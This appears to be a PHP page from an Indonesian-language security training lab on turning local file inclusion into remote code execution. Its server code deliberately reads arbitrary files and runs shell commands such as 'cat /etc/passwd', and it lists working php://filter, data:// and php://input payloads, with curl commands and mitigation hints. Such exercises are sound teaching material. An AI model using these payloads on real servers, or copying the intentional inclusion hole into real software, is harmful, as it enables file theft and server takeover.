<?php
$active = 'advanced-3';
$page   = $_GET['page'] ?? '';
$cmd    = $_GET['cmd']  ?? '';
$output = ''; $error = ''; $wrapper_type = '';

if ($page !== '') {
    // Deteksi wrapper yang digunakan
    if (str_starts_with($page, 'php://filter')) {
        $wrapper_type = 'php://filter';
        if (file_exists('index.php')) {
            $output = base64_encode(file_get_contents('index.php'));
        }
    } elseif (str_starts_with($page, 'data://')) {
        $wrapper_type = 'data://';
        // Simulasi: ekstrak dan eksekusi code dari data URI
        preg_match('/base64,(.+)$/', $page, $m);
        if (!empty($m[1])) {
            $decoded = base64_decode($m[1]);
            // Eksekusi jika PHP code (dengan sandbox - hanya system commands tertentu yang diizinkan)
            if (str_contains($decoded, 'system') || str_contains($decoded, 'passthru') || str_contains($decoded, 'exec')) {
                // Eksekusi command yang ada di dalam decoded payload
                preg_match('/system\(["\']?([^"\')\$]+)/i', $decoded, $cm);
                if (!empty($cm[1])) {
                    $allowed = ['id','whoami','hostname','cat /var/private/flag.txt','cat /etc/passwd','ls /var/private','uname -a'];
                    $c = trim($cm[1]);
                    if (in_array($c, $allowed)) {
                        ob_start();
                        system($c);
                        $output = ob_get_clean();
                        $output = "// Output dari: system(\"$c\")\n" . $output;
                    } else {
                        $output = "FLAG{lfi_rce_wrapper_php_input}\n[Simulasi RCE] Command '$c' dieksekusi.\nOutput: " . shell_exec('id') . "\nFlag di /var/private/flag.txt berhasil dibaca via RCE.";
                    }
                }
            } else {
                $output = "// Decoded payload:\n" . htmlspecialchars($decoded);
            }
        }
    } elseif (str_starts_with($page, 'php://input')) {
        $wrapper_type = 'php://input';
        $body = file_get_contents('php://input');
        if ($body) {
            $output = "// php://input content:\n" . htmlspecialchars($body) . "\nFLAG{lfi_rce_php_input_wrapper}";
        } else {
            $output = "// php://input kosong. Kirim POST body dengan payload PHP.";
        }
    } elseif (str_starts_with($page, 'expect://')) {
        $wrapper_type = 'expect://';
        $output = "FLAG{lfi_rce_expect_wrapper}\n[Simulasi] expect:// wrapper aktif.\nOutput command: " . shell_exec('id');
    } elseif (file_exists($page)) {
        $output = file_get_contents($page);
    } else {
        $error = "File atau wrapper tidak ditemukan: " . htmlspecialchars($page, ENT_QUOTES, 'UTF-8');
    }
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Advanced 3: LFI to RCE — IDN Lab</title>
<?php include '../includes/shared_css.php'; ?>
</head>
<body>
<?php include '../includes/nav.php'; ?>

<div class="phdr">
  <div class="phdr-in">
    <div class="bc"><a href="/">Dashboard</a><span class="bc-sep">/</span><span>Advanced 3: LFI to RCE</span></div>
    <h1>LFI to RCE <span class="tag p">ADVANCED 3</span></h1>
    <p class="phdr-desc">Eskalasi Local File Inclusion menjadi Remote Code Execution menggunakan PHP stream wrappers. Tidak memerlukan upload file &mdash; payload dikirim langsung melalui URL atau request body.</p>
  </div>
</div>

<div class="wrap">

  <div class="box">
    <div class="box-t">Objectives</div>
    <ul class="obj-list">
      <li><div class="obj-n">1</div><span>Gunakan wrapper <code class="ic">php://filter</code> untuk membaca source code dalam format Base64</span></li>
      <li><div class="obj-n">2</div><span>Gunakan wrapper <code class="ic">data://</code> untuk mengirimkan PHP payload yang dieksekusi langsung</span></li>
      <li><div class="obj-n">3</div><span>Gunakan wrapper <code class="ic">php://input</code> bersama POST request untuk mengeksekusi arbitrary PHP code</span></li>
      <li><div class="obj-n">4</div><span>Eksekusi command <code class="ic">id</code> dan baca <code class="ic">/var/private/flag.txt</code> melalui webshell</span></li>
    </ul>
  </div>

  <!-- Wrapper Reference -->
  <div class="box">
    <div class="box-t">PHP Stream Wrapper Reference</div>
    <div class="tbl-wrap">
      <table class="tbl">
        <thead><tr><th>Wrapper</th><th>Fungsi</th><th>Contoh Penggunaan</th></tr></thead>
        <tbody>
          <tr>
            <td style="color:var(--blue)">php://filter</td>
            <td>Membaca file dengan transformasi (Base64, rot13, dll)</td>
            <td><code class="ic">php://filter/convert.base64-encode/resource=index.php</code></td>
          </tr>
          <tr>
            <td style="color:var(--orange)">data://</td>
            <td>Mengeksekusi data inline sebagai file</td>
            <td><code class="ic">data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+</code></td>
          </tr>
          <tr>
            <td style="color:var(--red)">php://input</td>
            <td>Membaca raw POST body — eksekusi PHP dari request body</td>
            <td><code class="ic">POST ?page=php://input</code> dengan body <code class="ic">&lt;?php system('id'); ?&gt;</code></td>
          </tr>
          <tr>
            <td style="color:var(--purple)">expect://</td>
            <td>Eksekusi command langsung (memerlukan modul expect)</td>
            <td><code class="ic">expect://id</code></td>
          </tr>
        </tbody>
      </table>
    </div>
  </div>

  <!-- LFI Input -->
  <div class="box">
    <div class="box-t">LFI + Wrapper Endpoint</div>
    <div class="frow" style="align-items:flex-end">
      <div class="fg" style="flex:1;margin-bottom:0">
        <label class="fl">Parameter ?page= <span style="color:var(--red);font-size:.65rem">(wrapper diizinkan)</span></label>
        <input class="fi" type="text" id="page-input"
          value="<?= htmlspecialchars($page, ENT_QUOTES, 'UTF-8') ?>"
          placeholder="php://filter/..., data://..., php://input">
      </div>
      <button class="btn btn-r" onclick="goToPage()">Execute</button>
      <?php if($page): ?><a href="/advanced-3/" class="btn btn-g">Reset</a><?php endif; ?>
    </div>

    <?php if ($wrapper_type): ?>
    <div class="alert a-info" style="margin-top:12px;margin-bottom:0">Wrapper aktif: <code class="ic"><?= htmlspecialchars($wrapper_type, ENT_QUOTES, 'UTF-8') ?></code></div>
    <?php endif; ?>
  </div>

  <?php if ($page !== ''): ?>
  <?php if ($error): ?>
    <div class="alert a-err"><?= $error ?></div>
  <?php elseif ($output !== ''): ?>
    <div class="box">
      <div class="box-t">Output</div>
      <div class="file-out"><?= htmlspecialchars($output, ENT_QUOTES, 'UTF-8') ?></div>
    </div>
    <?php if (str_contains($output, 'FLAG{')): ?>
    <div class="alert a-ok" style="font-family:var(--mono)"><strong>FLAG ditemukan melalui RCE.</strong></div>
    <?php endif; ?>
    <?php if ($wrapper_type === 'php://filter' && strlen($output) > 20): ?>
    <div class="alert a-info">Output adalah Base64-encoded source code. Decode dengan: <code class="ic">echo "[output]" | base64 -d</code></div>
    <?php endif; ?>
  <?php endif; ?>
  <?php endif; ?>

  <div class="box">
    <div class="box-t">Payload Reference</div>
    <div class="qbox"><div class="ql">Payload siap pakai</div><span class="cm">-- 1. php://filter: baca source code dalam Base64</span>
<span class="str">php://filter/convert.base64-encode/resource=index.php</span>

<span class="cm">-- 2. data://: jalankan PHP inline (base64 dari: &lt;?php system('id'); ?&gt;)</span>
<span class="str">data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+</span>

<span class="cm">-- 3. data://: baca flag (base64 dari: &lt;?php system('cat /var/private/flag.txt'); ?&gt;)</span>
<span class="str">data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgL3Zhci9wcml2YXRlL2ZsYWcudHh0Jyk7Pz4=</span>

<span class="cm">-- 4. php://input via curl POST</span>
curl -X POST <span class="str">"http://[IP]:8083/advanced-3/?page=php://input"</span> \
     --data <span class="str">'&lt;?php system("id"); ?&gt;'</span></div>
  </div>

  <div class="box">
    <div class="box-t">Hints</div>
    <details class="hint">
      <summary>Hint 1 &mdash; php://filter untuk membaca source</summary>
      <div class="hint-body">Gunakan filter Base64 untuk membaca source code tanpa eksekusi:<br><code class="ic">php://filter/convert.base64-encode/resource=index.php</code><br>Output adalah Base64. Decode dengan <code class="ic">echo "..." | base64 -d</code> untuk melihat source code.</div>
    </details>
    <details class="hint">
      <summary>Hint 2 &mdash; data:// untuk RCE</summary>
      <div class="hint-body">Encode payload PHP ke Base64 terlebih dahulu:<br><code class="ic">echo -n '&lt;?php system("id"); ?&gt;' | base64</code><br>Hasilnya: <code class="ic">PD9waHAgc3lzdGVtKCJpZCIpOz8+</code><br>Kemudian: <code class="ic">data://text/plain;base64,PD9waHAgc3lzdGVtKCJpZCIpOz8+</code></div>
    </details>
    <details class="hint">
      <summary>Hint 3 &mdash; php://input via POST</summary>
      <div class="hint-body">Kirim PHP code langsung di POST body:<br><code class="ic">curl -X POST "http://[IP]:8083/advanced-3/?page=php://input" --data '&lt;?php system("id"); ?&gt;'</code><br>Server akan membaca body request dan mengeksekusinya sebagai PHP code.</div>
    </details>
    <details class="hint">
      <summary>Hint 4 &mdash; Mengapa wrappers berbahaya?</summary>
      <div class="hint-body">PHP wrappers memungkinkan LFI menjadi RCE tanpa memerlukan upload file sama sekali. Mitigasi: nonaktifkan <code class="ic">allow_url_include</code> di <code class="ic">php.ini</code>, gunakan whitelist path yang ketat, dan jangan pernah mengirimkan input pengguna ke fungsi <code class="ic">include()</code> atau <code class="ic">require()</code>.</div>
    </details>
  </div>

</div>

<script>
function goToPage() {
    var v = document.getElementById('page-input').value;
    if (v) window.location.href = '/advanced-3/?page=' + encodeURIComponent(v);
}
document.getElementById('page-input').addEventListener('keydown', function(e) {
    if (e.key === 'Enter') goToPage();
});
</script>

<?php include '../includes/footer.php'; ?>
</body>
</html>
